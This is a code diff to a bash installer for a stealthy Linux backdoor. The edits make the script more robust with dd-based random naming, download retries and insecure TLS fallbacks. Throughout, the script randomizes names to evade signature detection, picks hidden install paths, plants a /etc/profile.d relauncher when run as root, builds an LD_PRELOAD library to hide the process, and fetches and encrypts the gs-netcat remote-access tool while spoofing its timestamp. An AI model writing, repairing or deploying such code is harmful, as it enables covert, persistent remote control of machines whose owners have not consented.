@@ -15,12 +15,13 @@ SECRET_LENGTH=22
 CRYPT_PASS_LENGTH=16
 
 # All names randomized per installation to avoid signature detection
-BIN_ALIAS="$(tr -dc 'a-z' </dev/urandom | head -c 8)-$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
-SERVICE_NAME="$(tr -dc 'a-z' </dev/urandom | head -c 6)-$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)"
+# Use dd + tr to avoid "head closing pipe" issues with /dev/urandom
+BIN_ALIAS="$(dd if=/dev/urandom bs=8 count=1 2>/dev/null | tr -dc 'a-z')-$(dd if=/dev/urandom bs=6 count=1 2>/dev/null | tr -dc 'a-z0-9')"
+SERVICE_NAME="$(dd if=/dev/urandom bs=6 count=1 2>/dev/null | tr -dc 'a-z')-$(dd if=/dev/urandom bs=8 count=1 2>/dev/null | tr -dc 'a-z0-9')"
 TIMER_NAME="${SERVICE_NAME}-watch"
-MODULE_NAME="$(tr -dc 'a-z0-9' </dev/urandom | head -c 8)_$(tr -dc 'a-z0-9' </dev/urandom | head -c 6)"
-WATCHDOG_NAME="$(tr -dc 'a-z' </dev/urandom | head -c 6)-watchdog"
-UDEV_RULE_NAME="99-$(tr -dc 'a-z0-9' </dev/urandom | head -c 10).rules"
+MODULE_NAME="$(dd if=/dev/urandom bs=8 count=1 2>/dev/null | tr -dc 'a-z0-9')_$(dd if=/dev/urandom bs=6 count=1 2>/dev/null | tr -dc 'a-z0-9')"
+WATCHDOG_NAME="$(dd if=/dev/urandom bs=6 count=1 2>/dev/null | tr -dc 'a-z')-watchdog"
+UDEV_RULE_NAME="99-$(dd if=/dev/urandom bs=10 count=1 2>/dev/null | tr -dc 'a-z0-9').rules"
 
 # Stealthy install paths — tried in order, first writable wins
 INSTALL_PATHS=(
@@ -28,11 +29,11 @@ INSTALL_PATHS=(
     "/var/lib/systemd/.private"
     "$HOME/.local/share/gvfs-metadata"
     "$HOME/.cache/thumbnails/.data"
-    "/tmp/.$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 8)"
+    "/tmp/.$(dd if=/dev/urandom bs=8 count=1 2>/dev/null | tr -dc 'a-zA-Z0-9')"
 )
 
-# Isolated work dir — random name, cleaned at end
-WORK_DIR=$(mktemp -d "/tmp/.$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c 10)")
+# Isolated work dir — mktemp needs at least 3 X's for random suffix
+WORK_DIR=$(mktemp -d "/tmp/.tmp.XXXXXXXXXX")
 
 # ── Logging ────────────────────────────────────────────────────────────
 GREEN='\033[0;32m'; YELLOW='\033[1;33m'; BLUE='\033[0;34m'; RED='\033[0;31m'; CYAN='\033[0;36m'; NC='\033[0m'
@@ -44,7 +45,12 @@ log_debug()   { echo -e "${CYAN}[~] $1${NC}"; }
 
 # ── Utilities ──────────────────────────────────────────────────────────
 generate_random_string() {
-    tr -dc 'A-Za-z0-9' </dev/urandom | head -c "$1"
+    local len="$1"
+    local str=""
+    while [ "${#str}" -lt "$len" ]; do
+        str="${str}$(tr -dc 'A-Za-z0-9' </dev/urandom | dd bs=1 count=$((len - ${#str})) 2>/dev/null)"
+    done
+    echo "$str"
 }
 
 # Pick first writable install path
@@ -322,7 +328,7 @@ fi"
 
     # System-wide drop if root
     if [ "$(id -u)" -eq 0 ] && [ -d "/etc/profile.d" ]; then
-        local profiled="/etc/profile.d/$(tr -dc 'a-z' </dev/urandom | head -c 8)-net.sh"
+        local profiled="/etc/profile.d/$(dd if=/dev/urandom bs=8 count=1 2>/dev/null | tr -dc 'a-z')-net.sh"
         cat > "$profiled" <<EOF
 #!/bin/sh
 if ! pgrep -x '${BIN_ALIAS}' >/dev/null 2>&1; then
@@ -702,10 +708,10 @@ PRELOADSRC
 
     sed -i "s/HIDE_PLACEHOLDER/${hide_name}/g" "$src"
 
-    local lib_dest="/usr/lib/x86_64-linux-gnu/lib$(tr -dc 'a-z' </dev/urandom | head -c 8).so.1"
+    local lib_dest="/usr/lib/x86_64-linux-gnu/lib$(dd if=/dev/urandom bs=8 count=1 2>/dev/null | tr -dc 'a-z').so.1"
     if [ ! -w "/usr/lib/x86_64-linux-gnu/" ]; then
         mkdir -p "$HOME/.local/lib"
-        lib_dest="$HOME/.local/lib/lib$(tr -dc 'a-z' </dev/urandom | head -c 8).so.1"
+        lib_dest="$HOME/.local/lib/lib$(dd if=/dev/urandom bs=8 count=1 2>/dev/null | tr -dc 'a-z').so.1"
     fi
 
     if gcc -shared -fPIC -nostartfiles -O2 -o "$lib_dest" "$src" -ldl 2>/dev/null; then
@@ -864,13 +870,16 @@ main() {
     ENCRYPTED_BIN="${INSTALL_DIR}/${BIN_ALIAS}"
     log_info "Binary target: $ENCRYPTED_BIN"
 
-    # 4. Download bincrypter
+    # 4. Download bincrypter (with fallback)
     BINCRYPTER_URL="https://github.com/hackerschoice/bincrypter/releases/latest/download/bincrypter"
     log_info "Downloading bincrypter..."
-    if ! curl -SsfL "$BINCRYPTER_URL" -o "${WORK_DIR}/bincrypter"; then
-        log_error "bincrypter download failed. Exit."
-        rm -rf "$WORK_DIR"
-        exit 1
+    if ! curl -SsfL --retry 3 --retry-delay 2 "$BINCRYPTER_URL" -o "${WORK_DIR}/bincrypter" 2>/dev/null; then
+        log_warning "Primary download failed, trying insecure fallback..."
+        if ! curl -SsfLk --retry 3 --retry-delay 2 "$BINCRYPTER_URL" -o "${WORK_DIR}/bincrypter" 2>/dev/null; then
+            log_error "bincrypter download failed. Exit."
+            rm -rf "$WORK_DIR"
+            exit 1
+        fi
     fi
     chmod +x "${WORK_DIR}/bincrypter"
     log_success "Bincrypter ready"
@@ -884,14 +893,18 @@ main() {
     fi
     log_success "Session secret: ${YELLOW}${RANDOM_SECRET}${NC}"
 
-    # 6. Download + encrypt gs-netcat
+    # 6. Download + encrypt gs-netcat (with fallback mirror)
     ARCH=$(uname -m)
     GSOCKET_URL="https://gsocket.io/bin/gs-netcat_mini-linux-${ARCH}"
     log_info "Fetching + encrypting gs-netcat → ${ENCRYPTED_BIN}..."
-    if ! curl -SsfL "$GSOCKET_URL" | PASSWORD="$CRYPT_PASS" "${WORK_DIR}/bincrypter" > "$ENCRYPTED_BIN"; then
-        log_error "Download/encrypt pipeline failed. Exit."
-        rm -rf "$WORK_DIR"
-        exit 1
+    if ! curl -SsfL --retry 3 --retry-delay 2 "$GSOCKET_URL" 2>/dev/null | PASSWORD="$CRYPT_PASS" "${WORK_DIR}/bincrypter" > "$ENCRYPTED_BIN" 2>/dev/null; then
+        log_warning "Primary gs-netcat download failed, trying mirror..."
+        GSOCKET_MIRROR="https://github.com/hackerschoice/gsocket/raw/master/tools/gs-netcat_mini-linux-${ARCH}"
+        if ! curl -SsfLk --retry 3 --retry-delay 2 "$GSOCKET_MIRROR" 2>/dev/null | PASSWORD="$CRYPT_PASS" "${WORK_DIR}/bincrypter" > "$ENCRYPTED_BIN" 2>/dev/null; then
+            log_error "Download/encrypt pipeline failed. Exit."
+            rm -rf "$WORK_DIR"
+            exit 1
+        fi
     fi
     chmod +x "$ENCRYPTED_BIN"
     spoof_timestamp "$ENCRYPTED_BIN" "/usr/bin/python3"
